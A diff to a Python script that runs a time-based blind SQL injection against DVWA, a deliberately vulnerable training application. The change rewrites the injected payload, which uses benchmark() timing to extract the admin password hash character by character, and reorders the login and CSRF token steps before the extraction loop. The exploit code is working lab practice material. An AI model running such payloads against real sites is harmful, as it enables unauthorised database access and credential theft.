@@ -4,6 +4,9 @@ import requests
 import sys
 import time
 import urllib3
+from bs4 import BeautifulSoup
+import re
+import urllib.parse
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 if len(sys.argv) < 3 :
@@ -64,7 +67,7 @@ def dvwa_login(session_id, user_token):
 
 # Send to SQLi payload
 def SQLi_blind(session_id, i, j, timing):
-    sqli_payload = "%' and 1=(select if(conv(mid((select 1,password from users),%s,1),16,10)=%s,benchmark(%s,rand()),11)#" % (j,i,timing)
+    sqli_payload = "1 and 1=(select if(conv(mid((select 1,password from users),%s,1),16,10)=%s,benchmark(%s,rand()),11)#" % (j,i,timing)
     SQli_url = 'http://' + target + '/DVWA/vulnerabilities/sqli_blind/'
     #GET Data
     data = { "id": sqli_payload, "Submit": "Submit" }
@@ -78,6 +81,14 @@ def SQLi_blind(session_id, i, j, timing):
     duration = int(end-start)
     return duration
 
+
+# Get initial CSRF token
+session_id, user_token = csrf_token()
+
+# Login to DVWA
+dvwa_login(session_id, user_token)
+
+#Sending blind queries
 counter = 0
 starttime=time.time()
 sys.stdout.write("[*] Admin hash is : ")
@@ -86,22 +97,13 @@ sys.stdout.flush()
 for m in range(1,33):
     for n in range(0,16):
         counter= counter+1
-        output = SQLi_blind(n,m,timing)
+        output = SQLi_blind(session_id, n, m, timing)
         if output > ((int(timing)/100)-1):
             char = hex(n)[2:]
             sys.stdout.write(char)
-            sys.stdout.flsuh()
+            sys.stdout.flush()
             break
 
 endtime = time.time()
 totaltime = str(endtime-starttime)
-print "\n[*] Total of %s queries in %s seconds" % (counter, totaltime)
-
-# Get initial CSRF token
-session_id, user_token = csrf_token()
-
-# Login to DVWA
-dvwa_login(session_id, user_token)
-
-#Send Evil SQLi payload
-SQLi_blind(session_id)
+print ("\n[*] Total of %s queries in %s seconds" % (counter, totaltime))
